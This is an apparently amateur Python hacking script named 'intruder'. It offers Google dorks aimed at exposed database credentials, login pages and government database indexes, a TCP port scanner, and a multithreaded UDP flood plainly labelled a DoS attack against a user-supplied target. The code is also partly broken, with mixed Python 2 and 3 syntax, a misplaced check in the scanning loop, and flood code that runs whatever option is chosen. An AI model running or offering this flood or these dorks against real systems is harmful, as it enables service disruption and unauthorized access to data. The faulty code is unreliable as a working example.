print("welcome to the intruder,intruder is a data collection and pentestration tool.")
print("this tool developed by amir hazrati in 2020.")
print('''options:
1=google dorks
2=port scanning
3=dos attacking
''')
import socket
from datetime import *
import thread
import sys
import time
user_choose = input("what you like?")
if user_choose == 1:
    print('''google dorks:
    1=jdbc:mysql://localhost:3306/ + username + password ext:yml | ext:javascript -git -gitlab
    2=site:sftp.*.*/ intext:"login" intitle:"server login"
    3=intitle:"index of" "/xampp/htdocs" | "C:/xampp/htdocs/"
    4=intitle:"Sphider Admin Login"
    5=site:*gov.* intitle:index.of db''')
    sys.exit()
if user_choose == 2:
    ip = input("enter your target url : ")
    host = socket.gethostbyname(ip)
    print("*"*55)
    print("scanning ^ {} ^ please wait...".format(host))
    print("*"*55)
    time1 = datetime.now()
    try:
        for port in range (1,1024):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port))
        if result == 0:
            print("port {} :   open ".format(port))
            sock.close()
        time2 = datetime.now()
        time3 = time2 - time1
        print("scan Finished in : ",time3)
    except KeyboardInterrupt:      
        print("you press unknown or incorrect command")
        sys.exit()
if user_choose == 3:
    victim_addr = raw_input("enter your target url: ")
thread_count = input("How many packages do you want to send?: ")
victim_ip = socket.gethostbyname(victim_addr)
UDP_PORT = 80
MESSAGE = "DOS ATTACK!!!"
print "UDP target IP:", victim_ip
print "UDP target port:", UDP_PORT
time.sleep(3)

def dos(i):
	while True:	
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.sendto(MESSAGE, (victim_ip, UDP_PORT))
			print "Packet Sent"
		
for i in xrange(thread_count):
	try:
	 thread.start_new_thread( dos , ("Thread-"+str(i),) )
	except KeyboardInterrupt:
			sys.exit(0)
while 1:
    pass
